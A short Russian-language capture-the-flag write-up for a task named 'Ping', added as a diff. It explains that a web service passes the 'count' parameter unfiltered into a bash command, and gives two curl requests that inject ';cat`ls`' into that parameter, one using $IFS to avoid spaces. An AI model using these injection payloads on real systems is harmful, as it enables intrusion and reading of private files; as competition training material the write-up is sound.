@@ -1,0 +1,8 @@
+Ping
+Задача
+Эй парень, я слышал ты любишь пинг. У меня есть для тебя один:
+http://pastebin.com/sjQVsA5C
+Решение (задачу решило 7 участников)
+Уязвимость заключается в отсутствии фильтрации параметра count в http-запросе при подстановке его в команду, которая выполняется в bash. Решение задачи может быть таким
+curl 'http://spbctf.ppctf.net:7878/ping?host=google.com&count=1;cat%60ls%60'
+curl 'http://spbctf.ppctf.net:7878/ping?host=google.com&count=1;cat$IFS`ls`'
